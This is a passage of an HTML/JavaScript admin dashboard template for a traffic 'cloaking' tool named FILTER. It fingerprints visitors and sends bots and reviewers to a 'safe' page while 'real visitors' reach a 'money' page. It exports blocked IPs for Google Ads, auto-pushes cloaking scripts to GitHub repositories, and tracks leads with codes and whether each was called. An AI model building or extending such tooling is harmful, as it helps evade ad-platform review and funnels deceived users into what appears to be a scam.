    <!-- Site selector -->
    <div class="sb-site-wrap">
      <span class="sb-site-lbl">Viewing Site</span>
      <select class="sb-site-sel" onchange="changeSite(this.value)">
        <option value="" ${!siteFilter ? 'selected' : ''}>All Sites</option>
        ${siteOptHtml}
      </select>
    </div>

    <!-- Footer -->
    <div class="sb-footer">
      <span>FILTER v1.0</span>
      <a href="/admin/logout">Sign out</a>
    </div>
  </aside>

  <!-- Mobile overlay -->
  <div class="f-overlay" id="fOverlay" onclick="closeSidebar()"></div>

  <!-- ═══ MAIN ═══ -->
  <main class="f-main">

    <!-- Topbar -->
    <div class="f-topbar">
      <button class="f-hamburger" onclick="toggleSidebar()">☰</button>
      <div class="f-breadcrumb" id="fBreadcrumb">Dashboard</div>
      <div class="f-topbar-right">
        <span class="f-clock" id="fClock">--:--:--</span>
        <span class="f-tz-badge" onclick="navTo('settings',document.querySelector('[data-section=settings]'));setTimeout(function(){switchTab(document.querySelector('.stab[data-tab=tz]'),'stab-tz')},100)" title="Change display timezone">${escHtml(displayTz)}</span>

        <!-- Notification bell -->
        <div class="notif-wrap">
          <button class="notif-btn" onclick="toggleNotif()" title="Notifications">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
            <span class="notif-badge" id="notifBadge">0</span>
          </button>
          <div class="notif-dropdown" id="notifDropdown">
            <div class="notif-hdr"><span>Live Alerts</span><button class="notif-clear" onclick="clearNotifs()">Clear all</button></div>
            <div class="notif-list" id="notifList"><div class="notif-empty">No alerts yet</div></div>
          </div>
        </div>
      </div>
    </div>

    <!-- Content -->
    <div class="f-content">

      <!-- ── DASHBOARD ─────────────────────────────────── -->
      <div class="f-section active" id="sec-dashboard">
        <div class="sec-header mb16">
          <div>
            <div class="sec-title">Dashboard</div>
            <div class="sec-sub">${siteFilter ? 'Filtered to: ' + escHtml(selectedSite ? selectedSite.name : siteFilter) : 'All sites combined'} &nbsp;·&nbsp; UTC ${escHtml(timeStr)}</div>
          </div>
          ${siteCreated ? '<div class="rpill rpill-green">✓ Site created — script being pushed to GitHub…</div>' : ''}
        </div>

        <!-- KPI row -->
        <div class="kpi-grid">
          <div class="kpi">
            <div class="kpi-label">Today's Traffic</div>
            <div class="kpi-val">${todayTotal}</div>
            <div class="kpi-sub">All decisions today</div>
          </div>
          <div class="kpi kpi-green">
            <div class="kpi-label">Allowed</div>
            <div class="kpi-val">${todayAllow}</div>
            <div class="kpi-sub">${todayTotal > 0 ? Math.round(todayAllow/todayTotal*100) : 0}% of today</div>
          </div>
          <div class="kpi kpi-red">
            <div class="kpi-label">Blocked</div>
            <div class="kpi-val">${todayBlock}</div>
            <div class="kpi-sub">${blockRateToday}% block rate</div>
          </div>
          <div class="kpi kpi-blue">
            <div class="kpi-label">Active Now</div>
            <div class="kpi-val" id="kpiActive">${activeCount}</div>
            <div class="kpi-sub">Last 3 min</div>
          </div>
          <div class="kpi kpi-purple">
            <div class="kpi-label">Leads Today</div>
            <div class="kpi-val">${todayLeadCount}</div>
            <div class="kpi-sub">${allSubmits.length} total leads</div>
          </div>
        </div>

        <!-- Mid row: donut + bar chart + live feed -->
        <div class="dash-mid">
          <!-- Allow/Block donut -->
          <div class="f-card">
            <div class="f-card-title">Allow / Block Split</div>
            <div id="donutWrap">
              <canvas id="donutCanvas" width="160" height="160"></canvas>
              <div class="donut-center">
                <div class="donut-pct" style="color:var(--red)" id="donutPct">${blockRate}%</div>
                <div class="donut-lbl">blocked</div>
              </div>
            </div>
            <div class="chart-legend">
              <div class="leg-item"><span class="leg-dot" style="background:var(--green)"></span>Allow (${allAllow})</div>
              <div class="leg-item"><span class="leg-dot" style="background:var(--red)"></span>Block (${allBlock})</div>
            </div>
          </div>

          <!-- Hourly bar chart -->
          <div class="f-card">
            <div class="f-card-title">
              Hourly Traffic Today
              <span style="font-size:.65rem;color:var(--text3);font-weight:400">UTC hours</span>
            </div>
            <div id="barChartWrap">
              <canvas id="barCanvas"></canvas>
            </div>
            <div class="chart-legend mt8">
              <div class="leg-item"><span class="leg-dot" style="background:var(--green)"></span>Allow</div>
              <div class="leg-item"><span class="leg-dot" style="background:var(--red)"></span>Block</div>
            </div>
          </div>

          <!-- Live feed -->
          <div class="f-card">
            <div class="f-card-title">
              Live Activity
              <div class="live-top" style="margin:0;gap:6px">
                <span class="live-dot"></span>
                <span class="live-cnt" id="liveCnt">${activeCount}</span>
              </div>
            </div>
            <div class="lt-feed" id="ltFeed">
              ${liveInitRows || '<div style="text-align:center;padding:20px;font-size:.75rem;color:var(--text3)">Waiting for traffic…</div>'}
            </div>
          </div>
        </div>

        <!-- Bottom row: block reasons + top countries -->
        <div class="dash-bot">
          <div class="f-card">
            <div class="f-card-title">Block Reasons</div>
            <div class="f-table-wrap">
              <table>
                <thead><tr><th>Reason</th><th class="t-right">Count</th><th class="t-right">%</th></tr></thead>
                <tbody>${reasonTableRows}</tbody>
              </table>
            </div>
          </div>
          <div class="f-card">
            <div class="f-card-title">Top Countries</div>
            ${countryRows}
            <div class="mt12" style="font-size:.69rem;color:var(--text3)">
              ${exportCount} unique IPs available for Google Ads exclusion
              &nbsp;<a href="/admin/blocked-ips-export" style="color:var(--pri-l)">Export →</a>
            </div>
          </div>
        </div>

        <!-- Summary stats row -->
        <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px">
          <div class="f-card">
            <div class="f-card-title">Cloaking Engine</div>
            <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
              ${settings.enabled
                ? '<span class="db-live">● ENABLED</span>'
                : '<span class="db-pending">○ DISABLED</span>'}
            </div>
            <form method="POST" action="/admin/toggle">
              <label class="ts-wrap">
                <input type="checkbox" class="ts-input" ${settings.enabled ? 'checked' : ''} onchange="this.closest('form').submit()">
                <span class="ts-track"></span>
                <span class="ts-label">${settings.enabled ? 'Active — click to pause' : 'Paused — click to enable'}</span>
              </label>
            </form>
          </div>
          <div class="f-card">
            <div class="f-card-title">Frequency Tracker</div>
            <div class="kpi-val" style="font-size:1.4rem">${freqStoreSize}</div>
            <div class="kpi-sub">${repeatClicksIn24h} repeat-click blocks in 24h</div>
          </div>
          <div class="f-card">
            <div class="f-card-title">Lead Conversion</div>
            <div class="kpi-val" style="font-size:1.4rem">${callRate}%</div>
            <div class="kpi-sub">${calledLeads.length} of ${allSubmits.length} leads called</div>
          </div>
        </div>
      </div>

      <!-- ── SITES ─────────────────────────────────────── -->
      <div class="f-section" id="sec-sites">
        <div class="sec-header">
          <div>
            <div class="sec-title">Connected Sites</div>
            <div class="sec-sub">${sites.length} site${sites.length !== 1 ? 's' : ''} registered &nbsp;·&nbsp; Hub: ${escHtml(hubUrl)}</div>
          </div>
          <button class="btn-pri" onclick="openModal('addSiteModal')">+ Add Site</button>
        </div>

        ${!hasGithubToken ? '<div class="f-alert f-alert-warn"><strong>GitHub auto-inject is disabled.</strong> Set the <code>GITHUB_TOKEN</code> secret (Personal Access Token with <em>repo</em> scope) to enable automatic script injection into your repositories.</div>' : ''}

        <div class="site-list">
          ${siteListHtml || '<div class="empty-state">No sites yet — click Add Site to get started.</div>'}
        </div>
      </div>

      <!-- ── TRAFFIC LOGS ───────────────────────────────── -->
      <div class="f-section" id="sec-logs">
        <div class="sec-header">
          <div>
            <div class="sec-title">Traffic Logs</div>
            <div class="sec-sub">${logTotal} records &nbsp;·&nbsp; Timestamps in <strong>${escHtml(displayTz)}</strong></div>
          </div>
          <a href="/admin/blocked-ips-export" class="btn-ghost btn-sm">⬇ Export Blocked IPs</a>
        </div>

        <div class="filter-bar">
          <input type="text" class="filter-input" id="logSearch" placeholder="Search IP or country…" oninput="filterLogs()" style="min-width:180px">
          <select class="filter-select" id="logDecFilter" onchange="filterLogs()">
            <option value="">All decisions</option>
            <option value="allow">Allow only</option>
            <option value="block">Block only</option>
          </select>
        </div>

        <div class="f-card" style="padding:0">
          <div class="f-table-wrap">
            <table id="logsTable">
              <thead>
                <tr>
                  <th>Time (${escHtml(displayTz)})</th>
                  <th>IP</th>
                  <th>Country</th>
                  <th>City</th>
                  <th>ISP</th>
                  <th>Screen</th>
                  <th>Visitor TZ</th>
                  <th>Decision</th>
                  <th>Reason</th>
                  <th></th>
                </tr>
              </thead>
              <tbody id="logsBody">
                ${logRows || '<tr><td colspan="10" class="empty-state">No logs yet</td></tr>'}
              </tbody>
            </table>
          </div>
        </div>

        <div class="f-pagination">
          ${logPaginationHtml.replace(/class="pag-btn"/g,'class="f-pag-btn"').replace(/class="pag-btn pag-disabled"/g,'class="f-pag-disabled"').replace(/class="pag-info"/g,'class="f-pag-info"').replace(/class="pagination"/g,'style="display:contents"')}
        </div>
      </div>

      <!-- ── LEADS ─────────────────────────────────────── -->
      <div class="f-section" id="sec-leads">
        <div class="sec-header">
          <div>
            <div class="sec-title">Leads</div>
            <div class="sec-sub">${leadTotal} submissions &nbsp;·&nbsp; ${callRate}% called &nbsp;·&nbsp; Timestamps in <strong>${escHtml(displayTz)}</strong></div>
          </div>
          <div class="flex-gap8">
            <a href="data:text/csv;charset=utf-8,Time,IP,Country,City,Code,UTM,TZ,Called" download="leads.csv" class="btn-ghost btn-sm" id="csvExportBtn">⬇ Export CSV</a>
          </div>
        </div>

        <div class="f-card" style="padding:0">
          <div class="f-table-wrap">
            <table>
              <thead>
                <tr>
                  <th>Time (${escHtml(displayTz)})</th>
                  <th>IP</th>
                  <th>Country</th>
                  <th>City</th>
                  <th>Code</th>
                  <th>Source / UTM</th>
                  <th>Visitor TZ</th>
                  <th>Called?</th>
                </tr>
              </thead>
              <tbody>
                ${leadRows || '<tr><td colspan="8" class="empty-state">No leads yet</td></tr>'}
              </tbody>
            </table>
          </div>
        </div>
        <div class="f-pagination">
          ${leadPaginationHtml.replace(/class="pag-btn"/g,'class="f-pag-btn"').replace(/class="pag-btn pag-disabled"/g,'class="f-pag-disabled"').replace(/class="pag-info"/g,'class="f-pag-info"').replace(/class="pagination"/g,'style="display:contents"')}
        </div>
      </div>

      <!-- ── SETTINGS ──────────────────────────────────── -->
      <div class="f-section" id="sec-settings">
        <div class="sec-header mb16">
          <div><div class="sec-title">Settings</div><div class="sec-sub">Configure cloaking rules, security, and integrations</div></div>
        </div>

        <div class="stabs">
          <button class="stab active" data-tab="engine" onclick="switchTab(this,'stab-engine')">⚡ Engine</button>
          <button class="stab" data-tab="ips" onclick="switchTab(this,'stab-ips')">🛡 Blocked IPs</button>
          <button class="stab" data-tab="countries" onclick="switchTab(this,'stab-countries')">🌍 Countries</button>
          <button class="stab" data-tab="integrations" onclick="switchTab(this,'stab-integrations')">🔗 Integrations</button>
          <button class="stab" data-tab="tz" onclick="switchTab(this,'stab-tz')">🕐 Timezone</button>
          <button class="stab" data-tab="danger" onclick="switchTab(this,'stab-danger')">⚠ Danger Zone</button>
        </div>

        <!-- Engine tab -->
        <div class="stab-content active" id="stab-engine">
          <div class="f-card mb16">
            <div class="f-card-title">Cloaking Engine</div>
            <div class="flex-gap8 mb16">
              <form method="POST" action="/admin/toggle">
                <label class="ts-wrap">
                  <input type="checkbox" class="ts-input" ${settings.enabled ? 'checked' : ''} onchange="this.closest('form').submit()">
                  <span class="ts-track"></span>
                  <span class="ts-label" style="font-size:.88rem;font-weight:600">${settings.enabled ? '● Engine is ACTIVE — all traffic is being filtered' : '○ Engine is PAUSED — all visitors go to money page'}</span>
                </label>
              </form>
            </div>
            <p class="hint">When disabled, all visitors skip fingerprinting and go directly to the money URL.</p>
          </div>
          <div class="f-card">
            <div class="f-card-title">Default Site URLs</div>
            <form method="POST" action="/admin/settings">
              <div class="form-grid2">
                <div class="form-row">
                  <label>Money URL <span class="hint" style="display:inline">(real visitors go here)</span></label>
                  <input type="text" name="moneyUrl" value="${escHtml(settings.moneyUrl || '')}" placeholder="https://your-offer-page.com">
                </div>
                <div class="form-row">
                  <label>Safe URL <span class="hint" style="display:inline">(bots go here)</span></label>
                  <input type="text" name="safeUrl" value="${escHtml(settings.safeUrl || '')}" placeholder="https://your-safe-page.com">
                </div>
              </div>
              <button type="submit" class="btn-pri mt12">Save URLs</button>
            </form>
          </div>
        </div>

        <!-- Blocked IPs tab -->
        <div class="stab-content" id="stab-ips">
          <div class="f-card">
            <div class="f-card-title">Permanently Blocked IPs
              <a href="/admin/blocked-ips-export" class="btn-ghost btn-sm">⬇ Export for Google Ads</a>
            </div>
            <p class="hint mb12">These IPs are always blocked, regardless of geo or fingerprint checks. ${exportCount} unique IPs ready for export.</p>
            <form method="POST" action="/admin/blocked-ips">
              <div class="form-row">
                <label>Blocked IP list (one per line)</label>
                <textarea name="blockedIps" rows="8" id="blockedIpsInput">${escHtml(blockedIpsList.join('\n'))}</textarea>
              </div>
              <div class="flex-gap8 mt12">
                <button type="submit" class="btn-pri">Save Blocked IPs</button>
                <button type="button" class="btn-ghost" onclick="document.getElementById('blockedIpsInput').value=''">Clear All</button>
              </div>
            </form>
          </div>
        </div>

        <!-- Countries tab -->
        <div class="stab-content" id="stab-countries">
          <div class="f-card">
            <div class="f-card-title">Country Filter</div>
            <p class="hint mb12">Only allow visitors from these countries. Leave blank to allow all countries. Use ISO 2-letter codes (US, GB, CA, IN, AU…)</p>
            <form method="POST" action="/admin/allowed-countries">
              <div class="form-row">
                <label>Allowed countries</label>
                <input type="text" name="allowedCountries" value="${escHtml(allowedCountriesList.join(', '))}" placeholder="US CA GB AU IN — blank means allow all">
              </div>
              <div class="flex-gap8 mt12">
                <button type="submit" class="btn-pri">Save Filter</button>
                ${allowedCountriesList.length > 0 ? '<form method="POST" action="/admin/allowed-countries" class="inline"><input type="hidden" name="allowedCountries" value=""><button type="submit" class="btn-danger" onclick="return confirm(\'Remove country filter?\')">Remove Filter</button></form>' : ''}
              </div>
            </form>
            ${allowedCountriesList.length > 0 ? '<div class="mt12"><span class="hint">Active filter: </span>' + allowedCountriesList.map(function(c){ return '<span class="rpill rpill-amber" style="margin:2px">' + escHtml(c) + '</span>'; }).join('') + '</div>' : ''}
          </div>
        </div>

        <!-- Integrations tab -->
        <div class="stab-content" id="stab-integrations">
          <div class="f-card mb12">
            <div class="f-card-title">GitHub Integration</div>
            <div class="flex-gap8 mb12">
              ${hasGithubToken
                ? '<span class="db-live">● Connected</span><span class="hint">GITHUB_TOKEN is set — auto-inject and auto-push are enabled</span>'
                : '<span class="db-pending">○ Not connected</span><span class="hint" style="color:var(--amber)">Set GITHUB_TOKEN secret to enable auto-inject</span>'}
            </div>
            <p class="hint">Set a GitHub Personal Access Token with <code>repo</code> scope as the <strong>GITHUB_TOKEN</strong> environment secret. FILTER will automatically push cloaking scripts to your GitHub repositories when you create or update sites.</p>
          </div>
          <div class="f-card">
            <div class="f-card-title">Railway Integration</div>
            <div class="flex-gap8 mb12">
              ${hasRailwayToken
                ? '<span class="db-live">● Connected</span><span class="hint">Railway API token is configured — auto-redeploy and deploy monitoring are active</span>'
                : '<span class="db-pending">○ Not connected</span><span class="hint" style="color:var(--amber)">Enter your Railway API token below to enable deploy monitoring</span>'}
            </div>
            <p class="hint mb12">Your Railway API token lets FILTER trigger live redeployments and stream deploy status in real-time. The <code>RAILWAY_API_TOKEN</code> environment variable takes priority over the form below.</p>
            <form method="POST" action="/admin/settings/railway-token">
              <div class="form-row" style="gap:8px;align-items:center;flex-wrap:nowrap">
                <input type="password" name="railwayToken" autocomplete="new-password"
                  placeholder="${hasRailwayToken ? '••••••••••••••••  (token is set)' : 'Paste Railway API token…'}"
                  style="flex:1;background:#0d0018;border:1px solid #2e1655;color:#e2d9ff;padding:8px 12px;border-radius:8px;font-size:0.85rem">
                <button type="submit" class="btn-primary" style="padding:8px 18px;font-size:0.85rem;white-space:nowrap">Save Token</button>
                ${hasRailwayToken
                  ? '<button type="submit" name="railwayToken" value="" style="background:#1a0030;border:1px solid #7f1d1d;color:#f87171;padding:8px 12px;border-radius:8px;font-size:0.78rem;cursor:pointer;white-space:nowrap">Clear</button>'
                  : ''}
              </div>
            </form>
            <p class="hint" style="margin-top:8px">Once connected, FILTER will <strong>auto-discover Railway project &amp; service IDs</strong> from the GitHub repo URL when you add a new site, and deploy status badges update live in the Sites tab without page refresh.</p>
          </div>
        </div>

        <!-- Timezone tab -->
        <div class="stab-content" id="stab-tz">
          <div class="f-card">
            <div class="f-card-title">Display Timezone</div>
            <p class="hint mb12">All dashboard timestamps (logs, leads) will be shown in your chosen timezone. The visitor's own timezone is always captured separately and shown in the Visitor TZ column.</p>
            <div class="form-row">
              <label>Your timezone</label>
              <select id="tzSelector" style="max-width:320px">
                <optgroup label="Asia">
                  <option value="Asia/Kolkata" ${displayTz==='Asia/Kolkata'?'selected':''}>India (IST, UTC+5:30)</option>
                  <option value="Asia/Dubai" ${displayTz==='Asia/Dubai'?'selected':''}>Dubai (GST, UTC+4)</option>
                  <option value="Asia/Singapore" ${displayTz==='Asia/Singapore'?'selected':''}>Singapore (SGT, UTC+8)</option>
                  <option value="Asia/Tokyo" ${displayTz==='Asia/Tokyo'?'selected':''}>Tokyo (JST, UTC+9)</option>
                  <option value="Asia/Shanghai" ${displayTz==='Asia/Shanghai'?'selected':''}>China (CST, UTC+8)</option>
                  <option value="Asia/Karachi" ${displayTz==='Asia/Karachi'?'selected':''}>Pakistan (PKT, UTC+5)</option>
                  <option value="Asia/Dhaka" ${displayTz==='Asia/Dhaka'?'selected':''}>Bangladesh (BST, UTC+6)</option>
                </optgroup>
                <optgroup label="Americas">
                  <option value="America/New_York" ${displayTz==='America/New_York'?'selected':''}>New York (EST/EDT)</option>
                  <option value="America/Chicago" ${displayTz==='America/Chicago'?'selected':''}>Chicago (CST/CDT)</option>
                  <option value="America/Los_Angeles" ${displayTz==='America/Los_Angeles'?'selected':''}>Los Angeles (PST/PDT)</option>
                  <option value="America/Toronto" ${displayTz==='America/Toronto'?'selected':''}>Toronto (EST/EDT)</option>
                  <option value="America/Sao_Paulo" ${displayTz==='America/Sao_Paulo'?'selected':''}>São Paulo (BRT)</option>
                </optgroup>
                <optgroup label="Europe">
                  <option value="Europe/London" ${displayTz==='Europe/London'?'selected':''}>London (GMT/BST)</option>
                  <option value="Europe/Paris" ${displayTz==='Europe/Paris'?'selected':''}>Paris (CET/CEST)</option>
                  <option value="Europe/Berlin" ${displayTz==='Europe/Berlin'?'selected':''}>Berlin (CET/CEST)</option>
                  <option value="Europe/Moscow" ${displayTz==='Europe/Moscow'?'selected':''}>Moscow (MSK)</option>
                </optgroup>
                <optgroup label="Pacific / Africa">
                  <option value="Australia/Sydney" ${displayTz==='Australia/Sydney'?'selected':''}>Sydney (AEST)</option>
                  <option value="Pacific/Auckland" ${displayTz==='Pacific/Auckland'?'selected':''}>Auckland (NZST)</option>
                  <option value="Africa/Lagos" ${displayTz==='Africa/Lagos'?'selected':''}>Lagos (WAT)</option>
                  <option value="Africa/Johannesburg" ${displayTz==='Africa/Johannesburg'?'selected':''}>Johannesburg (SAST)</option>
                </optgroup>
                <optgroup label="Universal">
                  <option value="UTC" ${displayTz==='UTC'?'selected':''}>UTC (Universal)</option>
                </optgroup>
              </select>
            </div>
            <button type="button" class="btn-pri mt12" onclick="saveTz()">Save Timezone</button>
            <p class="hint mt8">Takes effect immediately — the page will reload to apply the new timezone to all timestamps.</p>
          </div>
        </div>

        <!-- Danger Zone tab -->
        <div class="stab-content" id="stab-danger">
          <div class="f-card danger-zone">
            <div class="danger-title">⚠ Danger Zone</div>
            <p class="hint mb16">These actions cannot be undone. All data in the affected store will be permanently deleted.</p>
            <div style="display:flex;flex-direction:column;gap:10px">
              <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(239,68,68,.15)">
                <div>
                  <div style="font-size:.82rem;font-weight:600">Clear Traffic Logs</div>
                  <div class="hint">${logTotal} records will be deleted</div>
                </div>
                <form method="POST" action="/admin/clear-logs">
                  <button type="submit" class="btn-danger" onclick="return confirm('Delete all ${logTotal} traffic log records? Cannot be undone.')">Clear Logs</button>
                </form>
              </div>
              <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(239,68,68,.15)">
                <div>
                  <div style="font-size:.82rem;font-weight:600">Clear Leads</div>
                  <div class="hint">${leadTotal} lead records will be deleted</div>
                </div>
                <form method="POST" action="/admin/clear-leads">
                  <button type="submit" class="btn-danger" onclick="return confirm('Delete all ${leadTotal} lead records? Cannot be undone.')">Clear Leads</button>
                </form>
              </div>
              <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 0">
                <div>
                  <div style="font-size:.82rem;font-weight:600">Reset Frequency Tracker</div>
                  <div class="hint">${freqStoreSize} entries in memory store</div>
                </div>
                <form method="POST" action="/admin/clear-frequency">
                  <button type="submit" class="btn-danger">Reset Tracker</button>
                </form>
              </div>
            </div>
          </div>
        </div>

      </div><!-- /sec-settings -->

    </div><!-- /f-content -->
  </main><!-- /f-main -->
</div><!-- /f-app -->

<!-- ── ADD SITE MODAL ──────────────────────────────── -->
<div class="f-modal" id="addSiteModal">
  <div class="f-modal-box">
    <div class="f-modal-hdr">
      <span class="f-modal-title">+ Add New Site</span>
      <button class="f-modal-close" onclick="closeModal('addSiteModal')">✕</button>
    </div>
    <form method="POST" action="/admin/sites">
      <div class="form-grid2">
        <div class="form-row">
          <label>Site Name *</label>
          <input type="text" name="name" placeholder="My Peacock Site" required>
        </div>
        <div class="form-row">
          <label>Domain</label>
          <input type="text" name="domain" placeholder="mypeacocksite.com">
        </div>
        <div class="form-row">
          <label>GitHub Repo URL</label>
          <input type="text" name="githubRepo" placeholder="https://github.com/user/repo">
        </div>
        <div class="form-row">
          <label>Money URL</label>
          <input type="text" name="moneyUrl" placeholder="https://your-offer-page.com">
        </div>
      </div>
      <p class="hint mt8">FILTER will automatically generate an API key, create hub-hosted safe and money pages, and push the cloaking script to your GitHub repo.</p>
      <div class="flex-gap8 mt16">
        <button type="submit" class="btn-pri">Create Site →</button>
        <button type="button" class="btn-ghost" onclick="closeModal('addSiteModal')">Cancel</button>
      </div>
    </form>
  </div>
</div>

<!-- ── TOAST CONTAINER ────────────────────────────── -->
<div class="f-toasts" id="fToasts"></div>

<script>
// ── Section routing ─────────────────────────────────────────────────────────
var sectionMap = { dashboard:'Dashboard', sites:'Sites', logs:'Traffic Logs', leads:'Leads', settings:'Settings' };
function navTo(id, btn) {
  document.querySelectorAll('.f-section').forEach(function(s){ s.classList.remove('active'); });
  var el = document.getElementById('sec-' + id);
  if (el) el.classList.add('active');
  document.querySelectorAll('.sb-link').forEach(function(b){ b.classList.remove('active'); });
  if (btn) btn.classList.add('active');
  var b = document.getElementById('fBreadcrumb');
  if (b) b.textContent = sectionMap[id] || id;
  window.location.hash = id;
  if (window.innerWidth <= 700) closeSidebar();
}
function initSection() {
  var hash = (window.location.hash || '#dashboard').slice(1);
  if (!sectionMap[hash]) hash = 'dashboard';
  var btn = document.querySelector('.sb-link[data-section="' + hash + '"]');
  navTo(hash, btn);
}
window.addEventListener('hashchange', function() { initSection(); });
document.addEventListener('DOMContentLoaded', function() { initSection(); });

// ── Mobile sidebar ──────────────────────────────────────────────────────────
function toggleSidebar() {
  document.getElementById('fSidebar').classList.toggle('open');
  document.getElementById('fOverlay').classList.toggle('open');
}
function closeSidebar() {
  document.getElementById('fSidebar').classList.remove('open');
  document.getElementById('fOverlay').classList.remove('open');
}

// ── Site filter ─────────────────────────────────────────────────────────────
function changeSite(val) {
  var hash = window.location.hash || '#dashboard';
  window.location.href = '/admin' + (val ? '?site=' + val : '') + hash;
}

// ── Clock ───────────────────────────────────────────────────────────────────
var _tz = '${escHtml(displayTz)}';
function updateClock() {
  var el = document.getElementById('fClock');
  if (!el) return;
  try {
    el.textContent = new Date().toLocaleTimeString('en-GB', { timeZone: _tz, hour12: false });
  } catch(e) {
    el.textContent = new Date().toUTCString().slice(17, 25);
  }
}
setInterval(updateClock, 1000);
updateClock();

// ── Timezone save ───────────────────────────────────────────────────────────
function saveTz() {
  var tz = document.getElementById('tzSelector').value;
  fetch('/admin/set-timezone', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ tz: tz })
  }).then(function(r){ return r.json(); }).then(function(d) {
    if (d.ok) { showToast('Timezone set to ' + tz, 'success'); setTimeout(function(){ location.reload(); }, 800); }
    else showToast('Invalid timezone', 'error');
  }).catch(function(){ showToast('Failed to save timezone', 'error'); });
}

// ── Tab switching (settings) ─────────────────────────────────────────────────
function switchTab(btn, contentId) {
  var parent = btn.closest('.stabs') || btn.parentElement;
  parent.querySelectorAll('.stab').forEach(function(b){ b.classList.remove('active'); });
  btn.classList.add('active');
  var section = btn.closest('.f-section') || document.getElementById('sec-settings');
  section.querySelectorAll('.stab-content').forEach(function(c){ c.classList.remove('active'); });
  var ct = document.getElementById(contentId);
  if (ct) ct.classList.add('active');
}

// ── Site row toggles ─────────────────────────────────────────────────────────
function toggleSlRow(btn, id) {
  var el = document.getElementById(id);
  if (!el) return;
  el.classList.toggle('open');
  btn.classList.toggle('open');
  btn.textContent = el.classList.contains('open') ? '✕ Close' : '⚙ Settings';
}
function switchSlTab(btn, id) {
  var group = btn.closest('.sl-tabs');
  if (group) group.querySelectorAll('.sl-tab').forEach(function(b){ b.classList.remove('active'); });
  btn.classList.add('active');
  var expand = btn.closest('.sl-expand');
  if (expand) expand.querySelectorAll('.sl-tab-content').forEach(function(c){ c.classList.remove('active'); });
  var el = document.getElementById(id);
  if (el) el.classList.add('active');
}

// ── Modal ────────────────────────────────────────────────────────────────────
function openModal(id) { var m = document.getElementById(id); if (m) m.classList.add('open'); }
function closeModal(id) { var m = document.getElementById(id); if (m) m.classList.remove('open'); }
document.addEventListener('keydown', function(e) { if (e.key === 'Escape') document.querySelectorAll('.f-modal.open').forEach(function(m){ m.classList.remove('open'); }); });

// ── Toast notifications ──────────────────────────────────────────────────────
function showToast(msg, type) {
  var c = document.getElementById('fToasts');
  if (!c) return;
  var icon = type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ';
  var t = document.createElement('div');
  t.className = 'f-toast' + (type ? ' ' + type : '');
  t.innerHTML = '<span style="font-size:1rem">' + icon + '</span><span>' + msg + '</span>';
  c.appendChild(t);
  setTimeout(function() {
    t.style.animation = 'slideOut .22s ease-in forwards';
    setTimeout(function(){ if (t.parentNode) t.parentNode.removeChild(t); }, 250);
  }, 3000);
}

// ── Copy helpers ─────────────────────────────────────────────────────────────
function copyKey(elId, key, btn) {
  navigator.clipboard.writeText(key).then(function() {
    var orig = btn.textContent;
    btn.textContent = '✓'; btn.style.color = 'var(--green)';
    setTimeout(function(){ btn.textContent = orig; btn.style.color = ''; }, 2000);
  }).catch(function(){ prompt('Copy API key:', key); });
}
function copySnippetById(id, btn) {
  var el = document.getElementById(id);
  if (!el) return;
  navigator.clipboard.writeText(el.textContent).then(function() {
    var orig = btn.textContent; btn.textContent = '✓ Copied'; btn.style.color = 'var(--green)';
    setTimeout(function(){ btn.textContent = orig; btn.style.color = ''; }, 2000);
  }).catch(function(){ prompt('Copy snippet:', el.textContent); });
}

// ── Quick block IP ────────────────────────────────────────────────────────────
function quickBlockIp(btn) {
  var ip = btn.dataset.ip;
  var site = btn.dataset.site;
  if (!ip || btn.classList.contains('blocked')) return;
  if (!confirm('Block IP ' + ip + ' immediately?')) return;
  fetch('/admin/block-ip-ajax', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip: ip, siteId: site })
  }).then(function(r){ return r.json(); }).then(function(d) {
    if (d.ok) {
      btn.classList.add('blocked');
      btn.title = 'Blocked';
      btn.textContent = '🚫';
      showToast('IP ' + ip + ' blocked', 'success');
    } else showToast('Failed to block IP', 'error');
  }).catch(function(){ showToast('Network error', 'error'); });
}

// ── Log table filter ─────────────────────────────────────────────────────────
function filterLogs() {
  var search = (document.getElementById('logSearch').value || '').toLowerCase();
  var dec    = (document.getElementById('logDecFilter').value || '').toLowerCase();
  var rows   = document.querySelectorAll('#logsBody tr');
  rows.forEach(function(row) {
    var text = row.textContent.toLowerCase();
    var matchSearch = !search || text.includes(search);
    var matchDec = !dec || text.includes(dec);
    row.style.display = (matchSearch && matchDec) ? '' : 'none';
  });
}

// ── Notification bell ─────────────────────────────────────────────────────────
var notifCount = 0;
var notifs = [];
function toggleNotif() {
  document.getElementById('notifDropdown').classList.toggle('open');
  notifCount = 0;
  var badge = document.getElementById('notifBadge');
  if (badge) { badge.textContent = '0'; badge.classList.remove('show'); }
}
function clearNotifs() {
  notifs = [];
  document.getElementById('notifList').innerHTML = '<div class="notif-empty">No alerts yet</div>';
}
document.addEventListener('click', function(e) {
  if (!e.target.closest('.notif-wrap')) document.getElementById('notifDropdown').classList.remove('open');
});
function addNotif(entry) {
  notifs.unshift(entry);
  if (notifs.length > 20) notifs.pop();
  notifCount++;
  var badge = document.getElementById('notifBadge');
  if (badge) { badge.textContent = notifCount > 9 ? '9+' : notifCount; badge.classList.add('show'); }
  var list = document.getElementById('notifList');
  if (list) {
    if (list.querySelector('.notif-empty')) list.innerHTML = '';
    var item = document.createElement('div');
    item.className = 'notif-item';
    var clsN = entry.decision === 'allow' ? 'notif-dec-allow' : 'notif-dec-block';
    item.innerHTML = '<div style="display:flex;justify-content:space-between"><span class="notif-ip">' + (entry.ip || '') + '</span><span class="' + clsN + '">' + (entry.decision || '') + '</span></div>'
      + '<span style="font-size:.68rem;color:var(--text3)">' + (entry.country || '') + ' · ' + (entry.reason || '') + '</span>';
    list.insertBefore(item, list.firstChild);
  }
}

// ── Canvas charts ────────────────────────────────────────────────────────────
window.addEventListener('DOMContentLoaded', function() {
  // Donut chart
